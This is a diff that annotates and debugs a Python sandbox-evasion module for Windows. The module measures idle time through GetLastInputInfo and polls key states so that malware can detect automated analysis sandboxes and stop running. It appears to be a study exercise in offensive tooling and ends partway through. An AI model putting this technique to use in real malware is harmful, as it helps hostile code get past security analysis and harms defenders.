@@ -1,36 +1,45 @@
+# sandbox evasion and user-activity detector that monitors system idle time and polls virtual key states to determine if a human user is
+# actively operating the machine, allowing malware to terminate itself if it detects an automated sandbox environment.
+
 from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
 import random
 import sys
 import time
 import win32api
 
-class LASTINPUTINFO(Structure):
-    fields_ = [
+# C compatible structure mirroring the LASTINPUTINFO API layout
+class LASTINPUTINFO(Structure): # defines the size of the structure and the timestamp of the last user input event
+    fields_ = [ 
         ('cbSize', c_uint),
         ('dwTime', c_ulong)
     ]
 
+# check system idle time
 def get_last_input():
-    struct_lastinputinfo = LASTINPUTINFO()
-    struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)
-    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))
-    run_time = windll.kernel32.GetTickCount()
-    elapsed = run_time - struct_lastinputinfo.dwTime
-    print(f"[*] It's been {elapsed} milliseconds since the last event.")
+    struct_lastinputinfo = LASTINPUTINFO() # instantiates the structure
+    struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO) # sets the correct size for the Windows API
+    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo)) # calls API to get the tick-count of the last keyboard/mouse input, 
+    # and inserts that into our struct
+    run_time = windll.kernel32.GetTickCount() # finds the total time the system has been up since boot
+    elapsed = run_time - struct_lastinputinfo.dwTime # subtracts last input time from run time to calculate idle time
+    print(f"[*] It's been {elapsed} milliseconds since the last event.") 
     return elapsed
 
 class Detector:
     def __init__(self):
+        # initializes counters for user activity tracking
         self.double_clicks = 0
-        self.keystroken = 0
+        self.keystrokes = 0
         self.mouse_clicks = 0
 
+    # loops through key codes to check for an input
+    # note: this could be done with PyWinHook as was done in the keylogger, but this uses a pure ctypes solution
     def get_key_press(self):
-        for i in range(0, 0xff):
-            state = win32api.GetAsyncKeyState(i)
+        for i in range(0, 0xff): # loop through 255 possible key codes (covering keyboard and mouse buttons)
+            state = win32api.GetAsyncKeyState(i) # calls the API to check the status of key 'i'
             if state & 0x0001:
                 if i == 0x1:
-                    self.mouse_click += 1
+                    self.mouse_clicks += 1
                     return time.time()
                 elif i > 32 and i < 127:
                     self.keystrokes += 1
